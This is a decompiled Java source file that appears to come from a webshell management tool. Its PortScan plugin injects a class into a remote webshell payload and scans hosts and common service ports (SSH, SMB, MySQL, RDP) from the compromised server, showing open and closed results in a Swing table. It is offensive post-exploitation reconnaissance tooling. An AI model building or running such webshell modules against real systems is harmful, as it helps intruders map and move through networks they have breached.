/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.generic;

import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.DataView;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.LinkedList;
import java.util.Vector;
import java.util.concurrent.CopyOnWriteArrayList;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.table.TableCellRenderer;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

public abstract class PortScan
implements Plugin {
    private static final Vector COLUMNS_VECTOR = new Vector<String>(new CopyOnWriteArrayList<String>(new String[]{"IP", "Port", "Status"}));
    private static final JLabel OPEN_LABEL = new JLabel("Open");
    private static final JLabel CLOSED_LABEL = new JLabel("Closed");
    private static ComponentRenderer COMPONENT_RENDERER = null;
    private final JPanel panel = new JPanel(new BorderLayout());
    private final DataView dataView;
    private final JButton scanButton;
    private final JButton stopButton;
    private final JLabel hostLabel;
    private final JLabel portLabel;
    private final JCheckBox onlyOpenPortCheckBox;
    private final JTextField hostTextField;
    private final JTextField portTextField;
    private final JSplitPane portScanSplitPane;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;
    private boolean isRunning;

    public PortScan() {
        COMPONENT_RENDERER = new ComponentRenderer();
        this.hostLabel = new JLabel("host :");
        this.portLabel = new JLabel("ports :");
        this.scanButton = new JButton("scan");
        this.stopButton = new JButton("stop");
        this.dataView = new DataView(null, COLUMNS_VECTOR, -1, -1);
        this.hostTextField = new JTextField("127.0.0.1", 15);
        this.portTextField = new JTextField("21,22,80-81,88,443,445,873,1433,3306,3389,8080,8088,8888", 60);
        this.onlyOpenPortCheckBox = new JCheckBox("\u4ec5\u663e\u793a\u5f00\u653e\u7aef\u53e3", false);
        this.portScanSplitPane = new JSplitPane();
        this.portScanSplitPane.setOrientation(0);
        this.portScanSplitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.hostLabel);
        topPanel.add(this.hostTextField);
        topPanel.add(this.portLabel);
        topPanel.add(this.portTextField);
        topPanel.add(this.onlyOpenPortCheckBox);
        topPanel.add(this.scanButton);
        topPanel.add(this.stopButton);
        this.portScanSplitPane.setTopComponent(topPanel);
        this.portScanSplitPane.setBottomComponent(new JScrollPane(this.dataView));
        this.dataView.getColumn("Status").setCellRenderer(COMPONENT_RENDERER);
        this.panel.add(this.portScanSplitPane);
    }

    private void load() {
        if (!this.loadState) {
            try {
                byte[] data = this.readPlugin();
                this.loadState = this.payload.include(this.getClassName(), data);
                if (this.loadState) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                } else {
                    Log.log("Load fail", new Object[0]);
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    public abstract byte[] readPlugin() throws IOException;

    public abstract String getClassName();

    private void scanButtonClick(ActionEvent actionEvent) {
        this.load();
        if (!this.isRunning) {
            this.isRunning = true;
            new Thread(() -> {
                long startTime = System.currentTimeMillis();
                LinkedList<String> hosts = functions.stringToIps(this.hostTextField.getText().trim());
                String ports = this.formatPorts(this.portTextField.getText().trim());
                if (ports.isEmpty() && hosts.isEmpty()) {
                    this.isRunning = false;
                    GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "host/ports \u662f\u7a7a\u7684");
                    return;
                }
                SwingUtilities.invokeLater(() -> this.dataView.getDataVector().clear());
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "\u5df2\u5f00\u542f\u626b\u63cf");
                hosts.forEach(host -> {
                    if (!this.isRunning) {
                        return;
                    }
                    Log.log("\u6b63\u5728\u626b\u63cf host:%s ports:%s ", host, ports);
                    try {
                        ReqParameter reqParamete = new ReqParameter();
                        reqParamete.add("ip", (String)host);
                        reqParamete.add("ports", ports);
                        byte[] result = this.payload.evalFunc(this.getClassName(), "run", reqParamete);
                        String resultString = this.encoding.Decoding(result);
                        SwingUtilities.invokeLater(() -> this.formatResult(resultString));
                    } catch (Exception e) {
                        Log.error(e);
                    }
                });
                this.isRunning = false;
                Log.log("\u626b\u63cf\u7ed3\u675f!!! \u626b\u63cf\u8017\u65f6: %dms", System.currentTimeMillis() - startTime);
            }).start();
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "\u5df2\u6709\u626b\u63cf\u7ebf\u7a0b");
        }
    }

    private void stopButtonClick(ActionEvent actionEvent) {
        if (this.isRunning) {
            this.isRunning = false;
            Log.log("PortScan: %s", "\u5df2\u505c\u6b62\u626b\u63cf!");
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "\u5df2\u505c\u6b62\u626b\u63cf!");
        }
    }

    private void closePlugin() {
        this.stopButtonClick(null);
    }

    private String formatPorts(String ports) {
        LinkedList<Integer> list = functions.stringToPorts(ports);
        StringBuilder stringBuilder = new StringBuilder();
        list.forEach(v -> stringBuilder.append(v.toString() + ","));
        if (stringBuilder.length() > 0) {
            return stringBuilder.substring(0, stringBuilder.length() - 1);
        }
        return stringBuilder.toString();
    }

    private void formatResult(String resultString) {
        String[] lines = resultString.split("\n");
        String[] infos = null;
        Vector<Vector> rowsVector = this.dataView.getDataVector();
        for (String line : lines) {
            infos = line.split("\t");
            if (infos.length >= 3) {
                boolean isOpen = "1".equals(infos[2]);
                if (this.onlyOpenPortCheckBox.isSelected() && !isOpen) continue;
                Vector<Object> oneRowVector = new Vector<Object>();
                oneRowVector.add(infos[0]);
                oneRowVector.add(infos[1]);
                oneRowVector.add(isOpen ? OPEN_LABEL : CLOSED_LABEL);
                rowsVector.add(oneRowVector);
                continue;
            }
            Log.error(line);
        }
        this.dataView.AddRows(rowsVector);
        this.dataView.getColumn("Status").setCellRenderer(COMPONENT_RENDERER);
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(PortScan.class, this, PortScan.class, this);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }

    static {
        OPEN_LABEL.setOpaque(true);
        CLOSED_LABEL.setOpaque(true);
        OPEN_LABEL.setBackground(Color.GREEN);
        CLOSED_LABEL.setBackground(Color.RED);
    }

    class ComponentRenderer
    implements TableCellRenderer {
        @Override
        public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
            if (Component.class.isAssignableFrom(value.getClass())) {
                Component component = (Component)value;
                if (isSelected) {
                    component.setForeground(table.getSelectionForeground());
                } else {
                    component.setForeground(table.getForeground());
                }
                return component;
            }
            return new JLabel(value.toString());
        }
    }
}

